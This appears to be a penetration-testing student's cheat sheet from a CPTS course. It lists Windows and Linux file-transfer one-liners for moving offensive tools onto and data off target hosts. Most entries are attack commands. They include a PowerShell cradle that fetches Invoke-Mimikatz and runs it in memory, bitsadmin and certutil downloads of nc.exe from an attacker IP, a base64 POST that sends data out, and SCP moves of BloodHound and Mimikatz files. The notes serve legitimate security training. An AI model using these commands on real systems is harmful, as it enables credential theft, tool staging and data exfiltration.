---
tags:
  - powershell
  - certutil
  - bitsadmin
  - wget
  - curl
  - Invoke-WebRequest
course: CPTS
---

# File Transfers

Download a file with PowerShell

```
Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1
```

Execute a file in memory using PowerShell

```
IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')
```

Upload a file with PowerShell

```
Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
```

Download a file using Bitsadmin

```
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
```

Download a file using Certutil

```
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

Download a file using Wget

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

Download a file using cURL

```
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

Download a file using PHP

```
php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

Upload a file using SCP

```
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
```

Download a file using SCP

```
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
```

Invoke-WebRequest using a Chrome User Agent

```
Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
```
